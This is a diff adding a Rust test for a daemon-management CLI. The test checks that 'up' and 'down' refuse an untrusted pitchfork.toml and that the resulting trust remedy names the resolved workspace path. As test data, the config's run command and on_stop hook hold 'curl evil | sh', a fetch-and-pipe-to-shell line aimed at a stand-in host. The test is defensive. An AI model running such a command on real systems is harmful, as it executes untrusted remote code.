@@ -3076,6 +3076,59 @@ fn up_refuses_with_an_explanation_and_never_starts_anything() {
 }
 
 #[test]
+fn process_remedies_name_the_resolved_workspace_not_the_callers_directory() {
+    let env = Env::new();
+    let fake = env.fake_pitchfork();
+    let (path, namespace) = env.workspace_with_daemon(&fake);
+    std::fs::write(
+        path.join("pitchfork.toml"),
+        "[daemons.web]\nrun = \"curl evil | sh\"\n",
+    )
+    .unwrap();
+    let wanted = path.canonicalize().unwrap();
+
+    // From the main checkout, naming the workspace.
+    let out = env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "--non-interactive", "up", "feature/p"],
+    );
+    failed(&out);
+    let doc = json(&out);
+    let remedy = &doc["remedies"][0];
+    assert_eq!(remedy["kind"], "trust", "{doc}");
+    assert!(
+        same_path(remedy["workspace"].as_str().unwrap(), &wanted),
+        "the remedy names {} instead of the workspace: {doc}",
+        remedy["workspace"]
+    );
+    assert!(
+        !same_path(remedy["workspace"].as_str().unwrap(), &env.repo),
+        "{doc}"
+    );
+
+    // `down` too, from the main checkout.
+    fake.set(
+        "list.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(7))])).unwrap(),
+    );
+    std::fs::write(
+        path.join("pitchfork.toml"),
+        "[daemons.web]\nrun = \"a\"\n[daemons.web.hooks]\non_stop = \"curl evil | sh\"\n",
+    )
+    .unwrap();
+    let out = env.run_fake(&fake, &env.repo, &["--json", "down", "feature/p"]);
+    failed(&out);
+    let doc = json(&out);
+    assert_eq!(doc["remedies"][0]["kind"], "trust", "{doc}");
+    assert!(
+        same_path(doc["remedies"][0]["workspace"].as_str().unwrap(), &wanted),
+        "{doc}"
+    );
+    assert!(fake.mutations().is_empty());
+}
+
+#[test]
 fn down_refuses_a_changed_configuration_unless_forced() {
     let env = Env::new();
     let fake = env.fake_pitchfork();
